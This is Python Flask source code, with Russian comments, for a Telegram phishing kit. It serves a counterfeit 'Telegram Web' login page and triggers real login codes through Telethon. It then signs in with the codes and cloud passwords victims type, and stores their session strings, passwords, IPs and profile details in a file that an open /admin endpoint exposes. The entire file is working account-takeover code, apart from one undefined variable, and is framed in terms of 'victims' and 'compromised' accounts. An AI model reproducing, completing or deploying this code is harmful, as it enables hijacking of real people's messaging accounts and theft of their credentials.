import os
import asyncio
import json
import logging
from datetime import datetime
from flask import Flask, request, jsonify
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError, 
    PhoneCodeInvalidError, 
    PhoneNumberInvalidError, 
    PhoneCodeExpiredError
)

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# 🔥 ПРЯМАЯ ЗАГРУЗКА КЛЮЧЕЙ
def load_api_keys():
    """Загружаем API ключи разными способами"""
    
    # Способ 1: Из .env файла
    try:
        from dotenv import load_dotenv
        load_dotenv()
        logger.info("✅ .env файл загружен")
    except ImportError:
        logger.warning("⚠️ python-dotenv не установлен")
    
    # Способ 2: Из переменных окружения или дефолтные
    API_ID = os.getenv('TELEGRAM_API_ID', '2040')
    API_HASH = os.getenv('TELEGRAM_API_HASH', 'b18441a1ff607e10a989891a5462e627')
    SECRET_KEY = os.getenv('SECRET_KEY', 'fallback-secret-key-12345')
    
    logger.info(f"🔐 Загружены ключи: API_ID={API_ID}, API_HASH={'*' * 10}")
    
    return API_ID, API_HASH, SECRET_KEY

# Загружаем ключи при старте
API_ID, API_HASH, SECRET_KEY = load_api_keys()
app.secret_key = SECRET_KEY

# Хранилища
VICTIMS_DATA = []
ACTIVE_SESSIONS = {}

class RealTelegramPhisher:
    def __init__(self):
        try:
            self.api_id = int(API_ID)
            self.api_hash = API_HASH
            self.initialized = True
            logger.info(f"✅ ФИШИНГ АКТИВИРОВАН! API ID: {self.api_id}")
        except (ValueError, TypeError):
            logger.error("❌ Неверный формат API ключей")
            self.initialized = False
        
    async def start_phishing_attack(self, phone_number):
        """Начинаем реальную фишинг-атаку"""
        if not self.initialized:
            return {
                'success': False, 
                'error': 'Проверьте API ключи в настройках Railway'
            }
            
        try:
            logger.info(f"🎯 Атака на номер: {phone_number}")
            
            session_id = f"phish_{int(datetime.now().timestamp())}"
            
            # Создаем Telegram клиент
            client = TelegramClient(
                StringSession(""),
                self.api_id,
                self.api_hash
            )
            
            await client.connect()
            
            # Отправляем реальный код
            result = await client.request_login_code(phone_number)
            
            ACTIVE_SESSIONS[session_id] = {
                'client': client,
                'phone': phone_number,
                'phone_code_hash': sent_code.phone_code_hash,
                'status': 'code_sent',
                'created_at': datetime.now().isoformat(),
                'ip': request.remote_addr,
                'user_agent': request.headers.get('User-Agent')
            }
            
            logger.info(f"📱 Реальный код отправлен Telegram на {phone_number}")
            
            return {
                'success': True,
                'session_id': session_id,
                'message': f'Код отправлен на {phone_number}',
                'next_step': 'enter_code',
                'is_real_telegram': True
            }
            
        except PhoneNumberInvalidError:
            logger.error(f"❌ Неверный номер: {phone_number}")
            return {'success': False, 'error': 'Неверный номер телефона'}
        except Exception as e:
            logger.error(f"❌ Ошибка: {e}")
            return {'success': False, 'error': f'Ошибка: {str(e)}'}
    
    async def process_victim_code(self, session_id, entered_code):
        """Обрабатываем код от жертвы"""
        if not self.initialized:
            return {'success': False, 'error': 'Система не инициализирована'}
        
        try:
            if session_id not in ACTIVE_SESSIONS:
                return {'success': False, 'error': 'Сессия не найдена'}
        
            session_data = ACTIVE_SESSIONS[session_id]
            client = session_data['client']
            phone = session_data['phone']
            phone_code_hash = session_data['phone_code_hash']
        
            logger.info(f"🔐 Жертва ввела код: {entered_code} для {phone}")
        
        # Сохраняем данные
            victim_data = {
                'session_id': session_id,
                'phone': phone,
                'entered_code': entered_code,
                'ip': request.remote_addr,
                'user_agent': request.headers.get('User-Agent'),
                'code_entered_at': datetime.now().isoformat(),
                'status': 'code_captured'
            }
        
            try:
            # 🔥 ИСПРАВЛЕННЫЙ МЕТОД - используем sign_in с правильными параметрами
                await client.sign_in(
                phone=phone,
                code=entered_code,
                phone_code_hash=phone_code_hash
            )
            
            # УСПЕХ! Полный доступ
                session_string = client.session.save()
                user = await client.get_me()
            
                victim_data.update({
                'status': 'FULL_ACCESS_GRANTED',
                'session_string': session_string,
                'user_id': user.id,
                'first_name': user.first_name,
                'last_name': user.last_name,
                'username': user.username,
                'compromised_at': datetime.now().isoformat()
            })
            
                VICTIMS_DATA.append(victim_data)
                self.save_victims_data()
            
                logger.critical(f"🎉 ПОЛНЫЙ ДОСТУП! Аккаунт {phone} скомпрометирован!")
            
                return {
                'success': True,
                'message': '✅ Авторизация успешна!',
                'next_step': 'complete',
                'redirect': '/success',
                'compromise_level': 'FULL_ACCESS'
            }
            
            except SessionPasswordNeededError:
            # Нужен пароль 2FA
                victim_data['status'] = 'NEED_PASSWORD'
                VICTIMS_DATA.append(victim_data)
            
                session_data['status'] = 'need_password'
                ACTIVE_SESSIONS[session_id] = session_data
            
                logger.info(f"🔒 Требуется пароль 2FA для {phone}")
            
                return {
                'success': True,
                'message': '🔒 Требуется пароль от облачного хранилища',
                'next_step': 'enter_password'
            }
            
            except PhoneCodeInvalidError:
                logger.warning(f"⚠️ Неверный код от {phone}")
                return {'success': False, 'error': 'Неверный код'}
            
            except PhoneCodeExpiredError:
                logger.warning(f"⚠️ Просроченный код от {phone}")
                return {'success': False, 'error': 'Код просрочен'}
            
        except Exception as e:
            logger.error(f"❌ Ошибка: {e}")
            return {'success': False, 'error': str(e)} 
    async def process_victim_password(self, session_id, password):
        """Обрабатываем пароль от жертвы"""
        if not self.initialized:
            return {'success': False, 'error': 'Система не инициализирована'}
        
        try:
            if session_id not in ACTIVE_SESSIONS:
                return {'success': False, 'error': 'Сессия не найдена'}
        
            session_data = ACTIVE_SESSIONS[session_id]
            client = session_data['client']
            phone = session_data['phone']
        
            logger.info(f"🔑 Жертва ввела пароль для {phone}")
        
            try:
            # 🔥 ИСПРАВЛЕННЫЙ МЕТОД - используем password для входа
                await client.sign_in(password=password)
            
            # УСПЕХ с паролем
                session_string = client.session.save()
                user = await client.get_me()
            
                victim_data = {
                'session_id': session_id,
                'phone': phone,
                'password': password,
                'session_string': session_string,
                'user_id': user.id,
                'first_name': user.first_name,
                'last_name': user.last_name,
                'username': user.username,
                'ip': request.remote_addr,
                'compromised_at': datetime.now().isoformat(),
                'status': 'FULL_ACCESS_WITH_PASSWORD'
            }
            
                VICTIMS_DATA.append(victim_data)
                self.save_victims_data()
            
                logger.critical(f"🎉 ДОСТУП С ПАРОЛЕМ! Аккаунт {phone} скомпрометирован!")
            
                return {
                'success': True,
                'message': '✅ Авторизация успешна!',
                'next_step': 'complete',
                'redirect': '/success'
            }
            
            except Exception as e:
                logger.warning(f"⚠️ Неверный пароль от {phone}: {e}")
                return {'success': False, 'error': 'Неверный пароль'}
            
        except Exception as e:
            logger.error(f"❌ Ошибка: {e}")
            return {'success': False, 'error': str(e)}
    def save_victims_data(self):
        """Сохраняем данные жертв"""
        try:
            with open('compromised_accounts.json', 'w', encoding='utf-8') as f:
                json.dump({
                    'victims': VICTIMS_DATA,
                    'total_compromised': len(VICTIMS_DATA),
                    'last_update': datetime.now().isoformat()
                }, f, ensure_ascii=False, indent=2)
        except Exception as e:
            logger.error(f"❌ Ошибка сохранения: {e}")

# Инициализация
phisher = RealTelegramPhisher()

def run_async(coro):
    return asyncio.run(coro)

# 🎯 Маршруты
@app.route('/')
def index():
    status = "✅ СИСТЕМА АКТИВНА" if phisher.initialized else "❌ СИСТЕМА НЕ ГОТОВА"
    status_color = "status-success" if phisher.initialized else "status-error"
    
    return f'''
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Web</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #18222d;
            color: white;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }}
        .auth-container {{
            width: 100%;
            max-width: 400px;
            background: #1e2a38;
            border-radius: 15px;
            padding: 40px 30px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }}
        .logo {{
            text-align: center;
            font-size: 48px;
            margin-bottom: 20px;
        }}
        .title {{
            text-align: center;
            font-size: 24px;
            margin-bottom: 10px;
            font-weight: 500;
        }}
        .subtitle {{
            text-align: center;
            color: #8a8a8a;
            margin-bottom: 30px;
        }}
        .input-group {{
            margin-bottom: 20px;
        }}
        .input-label {{
            display: block;
            margin-bottom: 8px;
            color: #8a8a8a;
            font-size: 14px;
        }}
        .input-field {{
            width: 100%;
            padding: 15px;
            background: #2b3b4d;
            border: 1px solid #3d5368;
            border-radius: 8px;
            color: white;
            font-size: 16px;
        }}
        .input-field:focus {{
            outline: none;
            border-color: #0088cc;
        }}
        .btn {{
            width: 100%;
            padding: 15px;
            background: #0088cc;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }}
        .btn:hover {{
            background: #0077bb;
        }}
        .btn:disabled {{
            background: #2b3b4d;
            cursor: not-allowed;
        }}
        .step {{
            display: none;
        }}
        .step.active {{
            display: block;
        }}
        .alert {{
            padding: 12px;
            border-radius: 8px;
            margin: 15px 0;
            font-size: 14px;
        }}
        .alert.success {{
            background: #1a3a2e;
            color: #4ade80;
            border: 1px solid #2d5c47;
        }}
        .alert.error {{
            background: #3a2a2a;
            color: #f87171;
            border: 1px solid #5c3d3d;
        }}
        .status-indicator {{
            padding: 8px 12px;
            border-radius: 6px;
            font-size: 12px;
            margin-bottom: 15px;
            text-align: center;
            border: 1px solid;
        }}
        .status-success {{
            background: #1a3a2e;
            color: #4ade80;
            border-color: #2d5c47;
        }}
        .status-error {{
            background: #3a2a2a;
            color: #f87171;
            border-color: #5c3d3d;
        }}
    </style>
</head>
<body>
    <div class="auth-container">
        <div class="logo">✈️</div>
        <h1 class="title">Telegram Web</h1>
        <p class="subtitle">Войдите в свой аккаунт Telegram</p>
        
        <div class="status-indicator {status_color}">
            {status}
        </div>
        
        <div id="stepPhone" class="step active">
            <div class="input-group">
                <label class="input-label">Номер телефона</label>
                <input type="tel" id="phoneInput" class="input-field" placeholder="+7 912 345-67-89" required>
            </div>
            <button class="btn" onclick="startPhishing()" id="phoneBtn">Получить код</button>
        </div>
        
        <div id="stepCode" class="step">
            <div class="alert success" id="codeAlert">
                📱 Код отправлен на <span id="phoneDisplay"></span>
            </div>
            <div class="input-group">
                <label class="input-label">Введите код из Telegram</label>
                <input type="text" id="codeInput" class="input-field" placeholder="12345" required>
            </div>
            <button class="btn" onclick="submitCode()" id="codeBtn">Продолжить</button>
        </div>
        
        <div id="stepPassword" class="step">
            <div class="alert success">
                🔒 Введите пароль от облачного хранилища
            </div>
            <div class="input-group">
                <label class="input-label">Пароль</label>
                <input type="password" id="passwordInput" class="input-field" placeholder="••••••••" required>
            </div>
            <button class="btn" onclick="submitPassword()" id="passwordBtn">Войти</button>
        </div>
        
        <div id="alertContainer"></div>
    </div>

    <script>
        let currentSessionId = '';
        let currentPhone = '';

        function showStep(step) {{
            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
            document.getElementById(`step${{step}}`).classList.add('active');
        }}

        function showAlert(message, type = 'success') {{
            const container = document.getElementById('alertContainer');
            container.innerHTML = `<div class="alert ${{type}}">${{message}}</div>`;
        }}

        async function startPhishing() {{
            const phone = document.getElementById('phoneInput').value.trim();
            if (!phone) {{
                showAlert('Введите номер телефона', 'error');
                return;
            }}

            currentPhone = phone;
            const btn = document.getElementById('phoneBtn');
            btn.disabled = true;
            btn.textContent = 'Отправка...';

            try {{
                const response = await fetch('/api/real/start', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{phone: phone}})
                }});
                
                const data = await response.json();
                
                if (data.success) {{
                    currentSessionId = data.session_id;
                    document.getElementById('phoneDisplay').textContent = phone;
                    showStep('Code');
                    showAlert('✅ Запрос отправлен. Ожидайте код.', 'success');
                }} else {{
                    showAlert('❌ ' + data.error, 'error');
                }}
            }} catch (error) {{
                showAlert('❌ Ошибка сети', 'error');
            }} finally {{
                btn.disabled = false;
                btn.textContent = 'Получить код';
            }}
        }}

        async function submitCode() {{
            const code = document.getElementById('codeInput').value.trim();
            if (!code) {{
                showAlert('Введите код', 'error');
                return;
            }}

            const btn = document.getElementById('codeBtn');
            btn.disabled = true;
            btn.textContent = 'Проверка...';

            try {{
                const response = await fetch('/api/real/code', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{
                        session_id: currentSessionId,
                        code: code,
                        phone: currentPhone
                    }})
                }});
                
                const data = await response.json();
                
                if (data.success) {{
                    if (data.next_step === 'enter_password') {{
                        showStep('Password');
                        showAlert('✅ Код принят. Введите пароль.', 'success');
                    }} else {{
                        window.location.href = data.redirect || '/success';
                    }}
                }} else {{
                    showAlert('❌ ' + data.error, 'error');
                }}
            }} catch (error) {{
                showAlert('❌ Ошибка сети', 'error');
            }} finally {{
                btn.disabled = false;
                btn.textContent = 'Продолжить';
            }}
        }}

        async function submitPassword() {{
            const password = document.getElementById('passwordInput').value;
            if (!password) {{
                showAlert('Введите пароль', 'error');
                return;
            }}

            const btn = document.getElementById('passwordBtn');
            btn.disabled = true;
            btn.textContent = 'Проверка...';

            try {{
                const response = await fetch('/api/real/password', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{
                        session_id: currentSessionId,
                        password: password,
                        phone: currentPhone
                    }})
                }});
                
                const data = await response.json();
                
                if (data.success) {{
                    window.location.href = data.redirect || '/success';
                }} else {{
                    showAlert('❌ ' + data.error, 'error');
                }}
            }} catch (error) {{
                showAlert('❌ Ошибка сети', 'error');
            }} finally {{
                btn.disabled = false;
                btn.textContent = 'Войти';
            }}
        }}

        document.getElementById('phoneInput').addEventListener('keypress', e => {{
            if (e.key === 'Enter') startPhishing();
        }});
        document.getElementById('codeInput').addEventListener('keypress', e => {{
            if (e.key === 'Enter') submitCode();
        }});
        document.getElementById('passwordInput').addEventListener('keypress', e => {{
            if (e.key === 'Enter') submitPassword();
        }});
    </script>
</body>
</html>
'''

@app.route('/api/real/start', methods=['POST'])
def api_real_start():
    data = request.get_json()
    phone = data.get('phone', '').strip()
    if not phone:
        return jsonify({'success': False, 'error': 'Введите номер'})
    result = run_async(phisher.start_phishing_attack(phone))
    return jsonify(result)

@app.route('/api/real/code', methods=['POST'])
def api_real_code():
    data = request.get_json()
    session_id = data.get('session_id')
    code = data.get('code', '').strip()
    if not session_id or not code:
        return jsonify({'success': False, 'error': 'Введите код'})
    result = run_async(phisher.process_victim_code(session_id, code))
    return jsonify(result)

@app.route('/api/real/password', methods=['POST'])
def api_real_password():
    data = request.get_json()
    session_id = data.get('session_id')
    password = data.get('password', '')
    if not session_id or not password:
        return jsonify({'success': False, 'error': 'Введите пароль'})
    result = run_async(phisher.process_victim_password(session_id, password))
    return jsonify(result)

@app.route('/success')
def success():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Telegram</title>
        <style>
            body {{ 
                font-family: -apple-system, BlinkMacSystemFont, sans-serif; 
                background: #18222d; 
                color: white; 
                margin: 0; 
                padding: 20px;
                display: flex;
                align-items: center;
                justify-content: center;
                min-height: 100vh;
            }}
            .container {{ 
                max-width: 400px; 
                text-align: center; 
            }}
            .logo {{ 
                font-size: 48px; 
                margin-bottom: 20px; 
            }}
            .btn {{ 
                background: #0088cc; 
                color: white; 
                padding: 15px 30px; 
                border: none; 
                border-radius: 10px; 
                font-size: 16px; 
                cursor: pointer;
                margin-top: 20px;
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo">✈️</div>
            <h1>Добро пожаловать в Telegram!</h1>
            <p>Ваш аккаунт успешно подключен.</p>
            <button class="btn" onclick="window.close()">Закрыть</button>
        </div>
    </body>
    </html>
    '''

@app.route('/admin')
def admin():
    return jsonify({
        'total_victims': len(VICTIMS_DATA),
        'full_access_count': len([v for v in VICTIMS_DATA if 'FULL_ACCESS' in v.get('status', '')]),
        'victims': VICTIMS_DATA,
        'api_initialized': phisher.initialized
    })

@app.route('/health')
def health():
    return jsonify({
        'status': 'ACTIVE' if phisher.initialized else 'INACTIVE',
        'victims_count': len(VICTIMS_DATA),
        'api_connected': phisher.initialized,
        'timestamp': datetime.now().isoformat()
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=False)
